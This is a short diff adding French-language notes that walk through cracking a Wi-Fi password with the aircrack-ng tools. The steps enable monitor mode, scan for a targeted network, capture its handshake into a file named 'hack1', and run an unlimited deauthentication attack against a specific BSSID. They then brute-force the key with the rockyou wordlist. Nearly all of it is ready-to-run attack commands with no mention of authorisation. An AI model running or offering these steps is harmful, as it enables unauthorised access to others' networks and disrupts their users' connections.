@@ -1,0 +1,35 @@
+
+
+! Afficher les interfaces reseaux avec :
+   ip addr
+   iwconfig
+
+!Tuer les processur qui pourrais gener notre manipulation
+       sudo airmon-ng check kill
+
+! Enclancher le monitor mode
+   sudo airmon-ng start wlan0
+
+!Verifier que le mode Monitor est enclanché.
+     iwconfig
+
+! Scanner les resaux et otenir l'adress mac de la station de notre essid ciblé et le nomeru de sa chaine
+        sudo airodump-ng wlan0
+
+on interromp le scan avec CTRL+C
+
+!1er terminal: On remplace le num devant -c avec le numero de la chaine et l'adresse mac avec celle de la station.
+
+sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0
+
+!2eme terminal: 
+comme celle d'avant
+sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0
+
+
+
+!Stop le mode Monitor
+airmon-ng stop wlan0mon
+
+!On utilise une bibliothéque pour déchiffrer le Mot de passe et c'est fini .
+aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt 
